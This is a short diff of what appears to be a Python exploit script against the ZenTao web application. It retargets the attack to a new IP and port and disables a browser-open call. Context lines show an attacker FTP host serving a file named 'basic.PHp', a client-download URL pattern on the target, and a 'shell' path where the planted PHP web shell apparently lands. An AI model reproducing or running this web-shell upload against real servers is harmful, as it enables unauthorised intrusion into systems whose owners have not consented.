@@ -5,7 +5,7 @@
 from threading import Thread
 
 my_server = b'ftp://192.168.50.161:2121/basic.PHp'
-base = '192.168.158.130:8082/zentao'
+base = '192.168.127.129:49154/zentao'
 host = 'http://' + base + '/client-download-1-%s-1.html'
 shell = 'http://' + base + '/data/client/1/basic.PHp'
 
@@ -47,4 +47,4 @@ t1_ftp.start()
 # print(res.text)
 import webbrowser
 
-webbrowser.open(url)
+# webbrowser.open(url)
